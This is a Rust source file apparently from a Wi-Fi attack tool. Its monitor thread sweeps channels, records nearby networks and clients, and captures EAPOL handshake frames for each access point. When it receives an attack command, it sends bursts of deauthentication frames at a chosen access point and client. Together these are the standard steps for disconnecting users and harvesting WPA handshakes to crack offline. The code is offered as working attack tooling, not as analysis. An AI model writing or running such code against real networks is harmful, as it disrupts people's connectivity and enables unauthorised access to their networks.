use crate::ipc::{IPCMessage,IPC,IOCommand,AttackMsg,DeauthAttack};
use wpa::NetworkInfo;
use std::sync::mpsc::{Sender,Receiver};
use std::collections::HashMap;
use core::time;

const MAX_CHANNEL: usize = 13;

type Bssid = String;
type MonitorSender = Sender<IPCMessage<HashMap<String,NetworkInfo>>>;
type MonitorReciever = Receiver<IPCMessage<HashMap<String,NetworkInfo>>>;
type NetworksInfo = HashMap<Bssid,NetworkInfo>;

pub struct MonitorThread{
    iface: String,
    channels: IPC<NetworksInfo>,
    networks: HashMap<Bssid, NetworkInfo>,
    sweep_mode: bool,
    channel: u8,
}

impl MonitorThread{
    pub fn init(iface:&str, rx:MonitorReciever, tx:MonitorSender) -> Self{
        MonitorThread{
            iface: iface.to_owned(),
            channels: IPC{
                rx,
                tx
            },
            networks: HashMap::new(),
            sweep_mode: false,
            channel: wlan::get_iface_channel(iface).unwrap()
        }

    }

    pub fn run(&mut self){
        loop{
            if self.sweep_mode{ //iterate channel if sweep mode is on
                self.channel = aux::modulos((self.channel+1) as i32,(MAX_CHANNEL+1) as i32) as u8;
                wlan::switch_iface_channel(&self.iface, self.channel);
            }
            //listen for new frames
            match wpa::listen_and_collect(&self.iface, time::Duration::from_secs(1)){
                Ok(captured_msgs) =>{
                    for msg in captured_msgs{
                        match msg{
                            wpa::ParsedFrame::Network(mut netinfo)=>{
                                //update client channel if found one
                                if !netinfo.clients.is_empty(){
                                    netinfo.clients[0].channel = self.channel;
                                }
                                self.networks.entry(hex::encode(netinfo.bssid))
                                    .and_modify(|e| e.update(&mut netinfo))
                                    .or_insert(netinfo);
                            },
                            wpa::ParsedFrame::Eapol(eapol)=>{
                                let entry = self.networks.iter().find(|(_,e)| hex::encode(e.bssid) == eapol.bssid);
                                if let Some((k,_)) = entry{
                                    self.networks.entry(k.clone()).and_modify(|e|e.add_eapol(eapol));
                                }
                            }
                        }
                    }
                },
                Err(_) => { self.channels.tx.send(IPCMessage::PermissionsError);},
            }
            //send back network information
            self.channels.tx.send(IPCMessage::Message(self.networks.clone()));

            //check if got new message
            if let Ok(msg) = self.channels.rx.try_recv(){
                match msg{
                    IPCMessage::IOCommand(cmd) =>{
                        match cmd{
                            IOCommand::Sweep =>{
                                self.sweep_mode = true;
                            },
                            IOCommand::ChangeChannel(c) =>{
                                wlan::switch_iface_channel(&self.iface, c);
                                self.channel = c;
                                self.sweep_mode = false;
                            },
                            _ =>{}//do nothing
                        }
                    },
                    IPCMessage::Attack(attack_info) =>{
                        match attack_info{
                            AttackMsg::DeauthAttack(attack) =>{
                                for _ in 0..16 {
                                    wpa::send_deauth(&self.iface, &attack.bssid, attack.client.clone());
                                }
                            },
                            _=>{},
                        }
                    },
                    IPCMessage::EndCommunication => {
                        return;
                    },
                    _=>{},
                }
            }
        }
    }

}



